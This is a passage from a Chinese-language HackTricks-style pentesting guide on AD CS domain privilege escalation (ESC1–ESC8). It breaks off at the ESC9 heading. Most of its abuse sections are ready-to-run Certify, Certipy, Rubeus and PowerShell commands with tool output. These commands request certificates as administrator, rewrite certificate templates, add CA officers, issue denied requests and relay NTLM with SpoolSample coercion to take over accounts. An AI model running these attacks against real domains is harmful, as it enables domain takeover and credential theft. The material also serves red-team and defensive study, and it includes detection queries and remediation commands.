# AD CS 域权限提升

{{#include ../../../banners/hacktricks-training.md}}


**这是对以下文章中权限提升技术章节的总结：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 配置错误的证书模板 - ESC1

### 说明

### ESC1：配置错误的证书模板

- **企业 CA 向低权限用户授予了注册权限。**
- **无需经理批准。**
- **无需授权人员签名。**
- **证书模板的安全描述符权限过于宽松，允许低权限用户获得注册权限。**
- **证书模板配置了可用于身份验证的 EKU：**
  - 包括客户端身份验证（OID 1.3.6.1.5.5.7.3.2）、PKINIT 客户端身份验证（1.3.6.1.5.2.3.4）、智能卡登录（OID 1.3.6.1.4.1.311.20.2.2）、任意用途（OID 2.5.29.37.0）等扩展密钥用法（EKU）标识符，或未设置 EKU（SubCA）。
- **模板允许请求者在证书签名请求（CSR）中包含 subjectAltName：**
  - 如果证书中存在 subjectAltName（SAN），Active Directory（AD）会优先使用它进行身份验证。这意味着，在 CSR 中指定 SAN 后，便可请求证书来冒充任意用户（例如域管理员）。请求者是否可以指定 SAN，由证书模板 AD 对象中的 `mspki-certificate-name-flag` 属性决定。此属性是一个位掩码；如果其中包含 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，请求者就可以指定 SAN。

> [!CAUTION]
> 这些设置只能表明该模板可能属于 ESC1，并不代表冒充路径已经成立。请确认目标主体能在发布该模板的 CA 上注册、CA 允许证书注册，并且签发的证书符合身份验证端点的强 SID 映射规则。当前已打补丁的 KDC 可能会拒绝请求的 UPN，前提是证书中的 SID 与目标不匹配；参见 [Microsoft 的证书映射指南](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)。

授予 **Domain Computers** 的注册权限，可能会使一个已准备好的计算机身份具备注册资格，即使原始用户没有注册权限。请单独评估计算机主体的权限。发起请求前，请检查 `msPKI-Minimal-Key-Size`：如果模板要求使用 4096 位 RSA 密钥，就会拒绝客户端默认的 2048 位密钥。只有 CA 和 KDC 接受最终证书及其映射时，在请求中提供目标 SID 才能解决 SID 不匹配问题；模板标志或 Enroll ACE 本身都不足以证明这一点。

有时会启用此功能，以支持产品或部署服务即时生成 HTTPS 或主机证书，也可能是因为相关人员不了解其影响。

值得注意的是，使用此选项创建证书会触发警告；但如果复制现有证书模板（例如已启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板），再修改该模板以包含身份验证 OID，则不会触发警告。<sup>[[6]](#references)</sup>

### 滥用

要**查找存在漏洞的证书模板**，可以运行：

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

要**利用此漏洞冒充管理员**，可以运行：

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

然后，你可以将生成的**证书转换为 `.pfx`** 格式，并再次使用 Rubeus 或 certipy 进行**身份验证**：<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows 二进制文件“Certreq.exe”和“Certutil.exe”可用于生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以运行以下 LDAP 查询，在 AD Forest 的配置架构中枚举证书模板，特别是那些无需审批或签名、具有 Client Authentication 或 Smart Card Logon EKU，且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的模板：

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## 配置错误的证书模板 - ESC2

### 说明

第二种滥用场景是第一种的变体：

1. Enterprise CA 向低权限用户授予了注册权限。
2. 禁用了经理审批要求。
3. 省略了对授权签名的要求。
4. 证书模板上过于宽松的安全描述符向低权限用户授予了证书注册权限。
5. **证书模板被定义为包含 Any Purpose EKU 或不包含 EKU。**

**Any Purpose EKU** 允许攻击者为**任何用途**获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以使用**与 ESC3 相同的技术**来利用此场景。

**不含 EKU** 的证书可充当从属 CA 证书，可被用于**任何用途**，并且**也可用于签发新证书**。因此，攻击者可以利用从属 CA 证书，在新证书中指定任意 EKU 或字段。

但是，如果从属 CA 不受 **`NTAuthCertificates`** 对象信任（这是默认设置），那么用于**域身份验证**的新证书将无法正常工作。尽管如此，攻击者仍可创建具有任意 EKU 和任意证书值的**新证书**。这些证书可能被**滥用**于各种用途（例如代码签名、服务器身份验证等），并可能对网络中的其他应用程序（如 SAML、AD FS 或 IPSec）造成重大影响。<sup>[[6]](#references)</sup>

要在 AD Forest 的配置架构中枚举符合此场景的模板，可以运行以下 LDAP 查询：

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## 配置错误的 Enrollment Agent 模板 - ESC3

### 说明

此场景与第一种和第二种类似，但**滥用**了**不同的 EKU**（Certificate Request Agent）和**两个不同的模板**（因此有两组要求），

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 **Enrollment Agent**，它允许主体代表其他用户**申请** **证书**。

**“enrollment agent”** 会申请此类**模板**，并使用由此获得的**证书代表其他用户共同签署 CSR**。随后，它会将**共同签署的 CSR** **发送**给 CA，申请一个**允许“代表他人申请”**的**模板**，CA 则会返回一张**属于“另一名”用户的证书**。<sup>[[6]](#references)</sup>

**要求 1：**

- Enterprise CA 向低权限用户授予申请权限。
- 不要求经理审批。
- 不要求授权签名。
- 证书模板的安全描述符过于宽松，向低权限用户授予申请权限。
- 证书模板包含 Certificate Request Agent EKU，因此可以代表其他主体申请其他证书模板。

**要求 2：**

- Enterprise CA 向低权限用户授予申请权限。
- 绕过经理审批。
- 版本 1 的目标模板可能允许 Enrollment Agent 申请，而无需较新的细粒度颁发策略控制；对于版本 2 或更高版本，应检查其应用程序策略颁发要求和授权签名，而不能仅因模板版本而将其排除。
- 证书模板中定义的 EKU 允许域身份验证。
- CA 未应用 Enrollment Agent 限制。

目标模板还必须由所选 CA 发布、允许目标账户申请，并支持预期的域身份验证用途。检查该账户所需的主题/SAN 属性；例如，如果模板从 AD 获取主题邮箱，则无法为缺少必需 `mail` 值的账户颁发证书。仅有 Enrollment Agent 证书并不能满足这些目标模板条件。

### 滥用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用此场景：<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

允许**获取** **enrollment agent certificate** 的 **users**、允许 **agents** enroll 的模板，以及 enrollment agent 可代表其行事的 **accounts**，都可以由企业 CA 加以限制。具体做法是打开 `certsrc.msc` **管理单元**，**右键单击 CA**，**单击“属性”**，然后**转到**“Enrollment Agents”选项卡。

不过，CA 的**默认**设置是“**Do not restrict enrollment agents**”。管理员启用 enrollment agent 限制并将其设为“Restrict enrollment agents”时，默认配置仍然极其宽松，允许 **Everyone** 以任何人的身份 enroll 所有模板。

### 仅限 Windows 的 Certi-Bhai PowerShell PoC

[**Certi-Bhai**](https://github.com/incredibleindeshell/Certi-Bhai) 无需 Certify 或 Certipy 即可测试 ESC1 和 ESC2/ESC3。它的脚本使用 `X509Enrollment` COM API 创建可导出的 2048 位 RSA 密钥，构建 PKCS#10 请求，通过 LDAP 查找第一个 `pKIEnrollmentService`，通过 `CertificateAuthority.Request` 提交请求，将响应安装到 `Cert:\CurrentUser\My`，并导出 Base64 编码的 PFX。ESC1 脚本添加攻击者指定的 UPN SAN（`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`，值为 `0xb`）；ESC2/ESC3 脚本则使用第一个证书签署 PKCS#7 代办请求。<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

这些脚本会打印 **PFX** 的 Base64 编码，其中包含私钥，可直接用于 Rubeus。不要将其替换为 `[Convert]::ToBase64String($cert.RawData)`：`RawData` 仅对公钥证书进行编码，无法为 PKINIT 请求签名。<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## 易受攻击的证书模板访问控制 - ESC4

### **说明**

**证书模板**上的**安全描述符**定义了特定 **AD 主体**对模板拥有的**权限**。

如果**攻击者**拥有**修改**模板并**实施**前文所述任何**可利用配置错误**所需的**权限**，就可能实现权限提升。

证书模板相关的重要权限包括：<sup>[[6]](#references)</sup>

- **Owner：**授予对对象的隐式控制权，允许修改任何属性。
- **FullControl：**授予对对象的完全控制权，包括修改任何属性的能力。
- **WriteOwner：**允许将对象的所有者更改为攻击者控制的主体。
- **WriteDacl：**允许调整访问控制，从而可能授予攻击者 FullControl。
- **WriteProperty：**允许编辑对象的任何属性。

还要检查 `CN=Certificate Templates,CN=Public Key Services,CN=Services,...` 容器上的 DACL。适用于 [`pKICertificateTemplate` 类](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c)的 `CreateChild` ACE，或范围较广的完全控制权限，都可能允许创建新的模板对象。[Microsoft 文档](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44)指出，该容器存放这些模板对象。判断创建操作是否有效前，应检查匹配的拒绝 ACE 和继承设置。创建模板本身不会签发证书：CA 必须发布该模板，请求主体必须拥有注册权限，并且证书必须能在身份验证端点映射到预期身份。

### 滥用

使用 Certify 枚举具有模板及其他 PKI 对象编辑权限的主体：

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

一个类似于前一个的 privesc 示例：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 是指用户对证书模板拥有写入权限。例如，可以利用此权限覆盖证书模板的配置，使该模板容易受到 ESC1 攻击。

一个允许 enrollee 提供主题、但仅启用 Server Authentication 用途的模板，本身并不是用户登录模板。拥有有效的模板控制权限后，攻击者可以在请求证书前修改其身份验证 EKU 或应用程序策略；[Microsoft 文档说明了 Smartcard Logon EKU 的登录用途](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)。请确认 CA 已发布修改后的模板、请求者有权注册、审批和签名要求均已满足，并且颁发的证书映射到预期账户。特别是，[处于 Full Enforcement 模式的已修补域控制器](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)会拒绝缺少强映射的证书；在请求中添加目标 UPN 并不能绕过这一要求。

如上面的路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 通过新的 `AddKeyCredentialLink` 边关联到了 `JOHNPC`。由于此技术与证书有关，我也实现了这一攻击，该攻击称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。<sup>[[8]](#references)</sup>下面简单预览一下 Certipy 的 `shadow auto` 命令如何获取受害者的 NT hash。

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** 可以通过一条命令覆盖证书模板的配置。**默认情况下**，Certipy 会**覆盖**配置，使其**易受 ESC1 攻击**。我们也可以指定 **`-save-old` 参数来保存旧配置**，这对于在攻击后**恢复**配置很有用。

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## 易受攻击的 PKI 对象访问控制 - ESC5

### 说明

由 ACL 支持的相互关联关系构成了庞大的网络，其中涉及证书模板和证书颁发机构以外的多个对象，这可能影响整个 AD CS 系统的安全性。这些会显著影响安全性的对象包括：

- CA 服务器的 AD 计算机对象，该对象可能通过 S4U2Self 或 S4U2Proxy 等机制遭到入侵。
- CA 服务器的 RPC/DCOM 服务器。
- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 中的任何后代 AD 对象或容器。此路径包括但不限于证书模板容器、证书颁发机构容器、NTAuthCertificates 对象和 Enrollment Services 容器等容器与对象。

如果低权限攻击者设法控制这些关键组件中的任何一个，PKI 系统的安全性就可能遭到破坏。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 说明

[**CQure Academy 帖子**](https://cqureacademy.com/blog/enhanced-key-usage)讨论了 Microsoft 概述的 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志所带来的影响。此配置在证书颁发机构 (CA) 上启用后，允许在**任何请求**的**主题备用名称**中加入**用户定义的值**，包括根据 Active Directory® 构造的请求。因此，攻击者可以通过任何为域**身份验证**配置的模板进行注册，尤其是允许**非特权**用户注册的模板，例如标准 User 模板。这样便可获取证书，使攻击者能够以域管理员或域内**任何其他活动实体**的身份进行身份验证。<sup>[[9]](#references)</sup>

**注意**：通过 `certreq.exe` 中的 `-attrib "SAN:"` 参数（称为“Name Value Pairs”）将**备用名称**附加到证书签名请求 (CSR) 的方法，与 ESC1 中利用 SAN 的策略**有所不同**。区别在于**账户信息的封装方式**——它位于证书属性中，而不是扩展中。

### 利用

组织可以使用以下 `certutil.exe` 命令来验证此设置是否已启用：

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

此操作本质上利用了**远程注册表访问**，因此，另一种方法可能是：

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测并利用此配置错误：<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

要修改这些设置，假设拥有**域管理员**权限或同等权限，可以从任意工作站执行以下命令：

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

要在你的环境中禁用此配置，可以通过以下方式移除该标志：

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> 在 2022 年 5 月安全更新发布后，新签发的**证书**将包含一个**安全扩展**，其中包含**请求者的 `objectSid` 属性**。对于 ESC1，此 SID 从指定的 SAN 派生。不过，对于 **ESC6**，SID 与**请求者的 `objectSid`** 相同，而不是 SAN。\
> 要利用 ESC6，系统必须容易受到 ESC10（弱证书映射）的影响，因为 ESC10 会优先使用 **SAN，而非新的安全扩展**。

## 易受攻击的证书颁发机构访问控制 - ESC7

### 攻击 1

#### 说明

证书颁发机构的访问控制通过一组用于管理 CA 操作的权限来实现。可以通过访问 `certsrv.msc`，右键单击 CA，选择“属性”，然后转到“安全”选项卡来查看这些权限。此外，还可以使用 PSPKI 模块通过以下命令枚举权限：

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

这提供了对主要权限的深入了解，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA 管理员”和“证书管理器”角色。<sup>[[6]](#references)</sup>

#### 滥用

在证书颁发机构上拥有 **`ManageCA`** 权限，可以通过 PSPKI 远程操纵设置。这包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志，以允许在任何模板中指定 SAN，这是 domain escalation 的关键环节。

使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 可以简化此过程，无需直接通过 GUI 进行交互即可修改设置。

拥有 **`ManageCertificates`** 权限，可批准待处理的请求，从而有效绕过“CA 证书管理器审批”防护措施。

可结合使用 **Certify** 和 **PSPKI** 模块来请求、批准并下载证书：

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> 在**上一个攻击**中，使用 **`Manage CA`** 权限**启用**了 **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志，以执行 **ESC6 attack**，但在重启 CA 服务（`CertSvc`）之前不会生效。当用户拥有 `Manage CA` 访问权限时，也允许其**重启服务**。不过，这**并不意味着用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，在大多数已打补丁的环境中，**ESC6 可能无法开箱即用**。

因此，这里介绍另一种攻击。

前提条件：

- 仅需 **`ManageCA` permission**
- **`Manage Certificates`** permission（可通过 **`ManageCA`** 授予）
- 必须**启用**证书模板 **`SubCA`**（可通过 **`ManageCA`** 启用）

该技术利用了这样一个事实：拥有 `Manage CA` **和** `Manage Certificates` 访问权限的用户可以**签发失败的证书请求**。证书模板 **`SubCA`** **易受 ESC1 攻击**，但**只有管理员**才能在该模板中注册。因此，**用户**可以请求在 **`SubCA`** 中注册——该请求会被**拒绝**——但随后可由管理员签发。<sup>[[6]](#references)</sup>

#### Abuse

你可以将自己的用户添加为新的 officer，以**授予自己 `Manage Certificates`** 访问权限。

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** 模板可以通过 `-enable-template` 参数在 CA 上启用。默认情况下，`SubCA` 模板处于启用状态。

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

如果我们已满足此攻击的先决条件，就可以从**申请基于 `SubCA` 模板的证书**开始。

**此请求将被拒绝**，但我们会保存私钥并记下请求 ID。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

通过我们的 **`Manage CA` 和 `Manage Certificates`**，随后可以使用 `ca` 命令和 `-issue-request <request ID>` 参数**颁发失败的证书请求**。

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数**检索已签发的证书**。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates 扩展滥用 (SetExtension)

#### 说明

除了经典的 ESC7 滥用方式（启用 EDITF 属性或批准待处理请求）外，**Certify 2.0** 还揭示了一种全新的原语，只需在 Enterprise CA 上拥有 *Manage Certificates*（又称 **Certificate Manager / Officer**）角色即可。<sup>[[3]](#references)</sup>

任何拥有 *Manage Certificates* 权限的主体都可以执行 `ICertAdmin::SetExtension` RPC 方法。传统上，合法 CA 使用此方法更新**待处理**请求的扩展；而攻击者可以滥用它，将一个**非默认**证书扩展（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）追加到等待审批的请求中。

由于目标模板**未为该扩展定义默认值**，请求最终签发时，CA 不会覆盖攻击者控制的值。因此，生成的证书会包含攻击者选择的扩展，可能用于：

* 满足其他易受攻击模板的 Application / Issuance Policy 要求（从而实现权限提升）。
* 注入额外的 EKU 或策略，使证书在第三方系统中获得意料之外的信任。

简而言之，过去被认为是 ESC7 中“权限较低”的一半的 *Manage Certificates*，如今也可用于实现完全权限提升或长期持久化，而无需修改 CA 配置，也不需要权限限制更严格的 *Manage CA* 权限。

#### 使用 Certify 2.0 滥用该原语

1. **提交一个会保持*待处理*状态的证书请求。**可以使用要求经理审批的模板来实现：
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **使用新的 `manage-ca` 命令将自定义扩展追加到待处理请求中**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *如果模板尚未定义 *Certificate Issuance Policies* 扩展，则上述值会在签发后保留。*

3. **签发请求**（如果你的角色也拥有 *Manage Certificates* 审批权限），或等待操作员批准。签发后，下载证书：
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. 生成的证书现在包含恶意 issuance-policy OID，可用于后续攻击（例如 ESC13、domain escalation 等）。

> 注意：使用 Certipy ≥ 4.7 时，也可以通过 `ca` 命令和 `-set-extension` 参数执行相同的攻击。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 说明

> [!TIP]
> 在**安装了 AD CS 的环境**中，如果存在**易受攻击的 Web enrollment endpoint**，且至少发布了一个允许**域计算机注册并进行客户端身份验证**的**证书模板**（例如默认的 **`Machine`** 模板），攻击者就可以**攻陷任何启用了 spooler 服务的计算机**！

AD CS 支持多种 **基于 HTTP 的注册方法**，管理员可通过安装额外的服务器角色来启用这些方法。这些用于 HTTP 证书注册的接口容易受到 **NTLM relay 攻击**。攻击者可以从一台**已攻陷的计算机**出发，冒充任何通过入站 NTLM 进行身份验证的 AD 帐户。冒充受害者帐户后，攻击者可以访问这些 Web 接口，使用 `User` 或 `Machine` 证书模板**申请客户端身份验证证书**。

- **Web enrollment 接口**（较旧的 ASP 应用程序，位于 `http://<caserver>/certsrv/`）默认仅使用 HTTP，因此无法防御 NTLM relay 攻击。此外，它通过 Authorization HTTP header 明确只允许 NTLM 身份验证，因此 Kerberos 等更安全的身份验证方法不适用。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service 和 **Network Device Enrollment Service**（NDES）默认通过 Authorization HTTP header 支持 negotiate 身份验证。Negotiate 身份验证**同时支持** Kerberos 和 **NTLM**，因此攻击者可以在 relay 攻击期间**降级为 NTLM** 身份验证。虽然这些 Web 服务默认启用 HTTPS，但仅使用 HTTPS **无法防御 NTLM relay 攻击**。只有将 HTTPS 与 channel binding 结合使用，才能防御针对 HTTPS 服务的 NTLM relay 攻击。遗憾的是，AD CS 不会在 IIS 上启用 Extended Protection for Authentication，而 channel binding 需要此功能。<sup>[[6]](#references)</sup>

NTLM relay 攻击的一个常见**问题**是 NTLM 会话持续时间**很短**，且攻击者无法与**要求 NTLM signing** 的服务交互。

不过，可以通过利用 NTLM relay 攻击为用户获取证书来克服这一限制，因为会话持续时间由证书有效期决定，而且该证书可以用于**强制要求 NTLM signing** 的服务。有关如何使用被盗证书的说明，请参阅：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 攻击的另一个限制是，**受害者帐户必须对攻击者控制的计算机进行身份验证**。攻击者可以等待，也可以尝试**强制**触发此身份验证：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **利用**

[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 命令可枚举**已启用的 HTTP AD CS endpoint**：<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性由企业证书颁发机构（CA）用于存储证书注册服务（CES）端点。可以使用 **Certutil.exe** 解析并列出这些端点：

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用

默认情况下，Certipy 会根据模板 `Machine` 或 `User` 请求证书，具体取决于被中继的账户名是否以 `$` 结尾。可以通过使用 `-template` 参数指定其他模板。

随后可以使用 [PetitPotam](https://github.com/ly4k/PetitPotam) 之类的技术强制进行身份验证。处理域控制器时，需要指定 `-template DomainController`。

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 说明

